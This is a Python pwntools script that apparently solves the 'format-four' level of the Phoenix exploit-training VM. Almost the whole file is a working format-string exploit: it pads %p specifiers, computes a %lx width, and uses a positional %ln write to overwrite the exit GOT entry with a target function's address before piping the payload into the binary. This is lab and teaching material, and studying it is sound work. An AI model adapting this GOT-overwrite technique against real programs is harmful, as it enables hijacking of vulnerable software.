from pwn import *

global_pad_char = b"A"


def pad_fixed_len(s, slen, pad_char):
    return s+pad_char*(slen-len(s))


def remove_padding(s,delimiter):
    return s.split(delimiter)[0]


def to_str(s):
    return str(s, encoding="utf-8")


def to_bytes(s):
    return bytes(s, "utf-8")


# makes sure last word in s is filled with pad_char until last word is full
# -> next word starts in clean block
def pad_8(s, pad_char):
    amount_padding_bytes = (8 - (len(s) % 8))
    print("format string to be padded: " + to_str(s))
    print("amount chars to be padded: " + str(amount_padding_bytes))
    # "20"  -> 7 dran
    # 20 42 42 42 42 42 42 42
    res = s+(amount_padding_bytes*pad_char)
    return res


def run_piped(level, payload):
    write("/tmp/docgil", payload)
    print("payload: ")
    print(remove_padding(read("/tmp/docgil"), global_pad_char*3))
    io = process("cat /tmp/docgil  | /opt/phoenix/amd64/"+level, shell=True)
    return io.recvall()


def run_args(level, payload):
    write("/tmp/docgil", payload)
    print("payload: ")
    print(remove_padding(read("/tmp/docgil"), global_pad_char*3))
    io = process("/opt/phoenix/amd64/"+level+" \"`cat /tmp/docgil`\"", shell=True)
    return io.recvall()


congratulations_adr = pack(0x400644, 64)
congrats_adr_decimal = 4195908


exit_got = pack(0x6009f0, 64)


# find amount %p's %x = hammer_length
# for i in range(0, 30):
#     payload = b""
#     print("index: " + str(i))
#     payload += b"A"*8
#     payload += b"%p "*i
#     # payload += b"%n"
#     # payload = pad(payload, 4096, b"A")
#     payload += exit_got
#     r = run("format-four", payload)
#     print(r)


payload = b""
payload += b"A"*8

target_value = congrats_adr_decimal
# target_value = 30000

# found out via try and error
hammer_length = 23
format_payload = b""
# -1 bc one %x still comes
format_payload += b"%p "*(hammer_length-1)

# offset found by trial and error
magic_offset = 90+28
# 22 spaces + 21*%p + 1*%x + magic_offset
amount_preceding_bytes = hammer_length + (hammer_length * 8) + magic_offset
offset = target_value - amount_preceding_bytes

format_padding = "%"+str(offset)+"lx "
format_padding = to_bytes(format_padding)

format_payload += format_padding
# l interprets as 64 bit value, otherwise most significant 4 bytes
# still have diff values, that were there before
format_payload += b"%"+to_bytes(str(hammer_length+1))+b"$ln"
# format_payload += b"%ln "

format_payload = pad_8(format_payload, b"B")
payload += format_payload
# need to put adr behind format specifiers cause 0/ byte in adr terminates string
payload += exit_got

# padding wont effect anything, bc \0 byte marks end of stream
# -> will be cut off anyways
# payload = pad_fixed_len(payload, 4096, global_pad_char)
r = run_piped("format-four", payload)
print(r)
